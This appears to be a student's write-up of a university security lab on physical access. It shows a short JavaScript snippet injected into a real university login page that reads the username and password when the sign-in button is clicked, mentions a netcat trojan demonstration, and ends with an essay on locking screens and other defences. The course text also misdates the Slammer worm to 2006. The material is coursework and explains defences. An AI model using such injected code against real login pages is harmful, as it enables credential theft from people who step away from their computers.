# Activity VI - Physical Security

[159_Ch8-Activity VI-PhysicalSecurity.pdf](https://prod-files-secure.s3.us-west-2.amazonaws.com/fde18c21-f9ca-47f8-8475-ed54a740baaa/8e00f6c5-c5cf-4628-942e-1100284e20d2/159_Ch8-Activity_VI-PhysicalSecurity.pdf)

## 1. Javascript Injection. Your friend has just logged out of ChulaSSO (https://account.it.chula.ac.th/) before leaving his/her computer. You have 2-3 minutes to inject a script to his/her browser so that you can steal his/her username (ChulaId) and password. For this class, please inject a javascript so that once your friend login (clicks the login button), it will pop up his/her username/password.

```jsx
const loginForm = document.getElementById("loginForm");
const userNameInput = loginForm.username;
const passwordInput = loginForm.password;
const signInButton = document.getElementById("btn_signin");
signInButton.onclick = function () {
    alert(`Username: ${userNameInput.value}\nPassword: ${passwordInput.value}\n`)
}
```

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/fde18c21-f9ca-47f8-8475-ed54a740baaa/6aa44490-c849-461d-8586-a154ac33a607/Untitled.png)

## 2. We will mimic an attack used by several worms for placing a trojan horse into
your computer. Please note that it is for demonstration purposes only. Please
do not abuse it.
This attack is partly taken from the MSSQL SLAMMER worm that was spread
in 2006.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/fde18c21-f9ca-47f8-8475-ed54a740baaa/154c99c7-3c8b-41d5-ae0c-ce3c1a018787/Untitled.png)

## 3. Write an essay to summarize the lesson that you have learned in this activity.
In particular,

1. Explain the worst case scenario that can happen if you leave your computer unattended.
    1. The most important lesson is how easily things may go wrong if we just leave our computers alone. The first example demonstrates how easy our personal information may be stolen by injecting JavaScript to obtain passwords. It's an important reminder that many of the security protocols we depend on, such as firewalls and antivirus software, can be violated if physical access to a device is given. This might result in our bank accounts being emptied, our identities being stolen, or someone gaining access to our private conversations.
2. Explain how a tool like netcat can be used for constructing a trojan horse. As a user, how will you prevent yourself from being a victim to such attacks?
    1. The second part of the exercise, which involves using Netcat to obtain remote access, shows the dangers that exist online. A simple tool called Netcat can be used to gain total control over a computer. This implies that without knowing about it, someone may erase our files, install malicious software, or exploit our computer for illegal activities. It's a clear example of how someone with bad intent may turn something that seems harmless into a weapon. So, how can we prevent being victims of such attacks? First, never leave our computers unattended in public places in order to protecting our digital lives. Second, we should always lock our screens when stepping away from computers. Using strong, unique passwords and changing them regularly are also crucial. For more advanced protection, enabling two-factor authentication (2FA) adds an extra layer of security. Keeping our software updated is crucial too. Updates often include fixes for security vulnerabilities that hackers can exploit. Finally, being aware about what networks we connect to and using VPNs can protect our data from being extracted.